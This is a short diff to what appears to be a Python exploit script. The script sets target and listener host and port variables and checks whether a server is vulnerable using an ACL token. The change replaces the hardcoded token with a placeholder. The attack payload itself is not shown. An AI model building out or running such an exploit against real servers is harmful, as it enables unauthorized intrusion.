@@ -63,7 +63,7 @@ if __name__ == '__main__':
     lhost = 'LHOST'
     lport = 'LPORT'
     uri = 'http://' + rhost + ':' + rport
-    acl_token = 'bb03b43b-1d81-d62b-24b5-39540ee469b5'
+    acl_token = '[ACL-TOKEN]'
 
     if check(uri, acl_token):
         print('\n[+] Server vulnerable & connection successfully')
